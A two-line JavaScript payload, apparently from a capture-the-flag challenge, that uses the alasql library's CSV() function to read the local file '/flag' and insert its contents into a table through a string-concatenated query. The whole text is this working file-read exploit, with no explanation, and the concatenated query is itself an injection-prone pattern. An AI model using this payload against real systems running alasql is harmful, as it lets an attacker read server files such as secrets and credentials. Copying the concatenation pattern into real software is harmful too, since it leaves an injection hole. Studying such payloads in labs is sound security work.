alasql("CREATE TABLE asdf")
alasql("SELECT * FROM CSV('/flag')").then(function(a){alasql("INSERT INTO asdf VALUE("+a+")")})
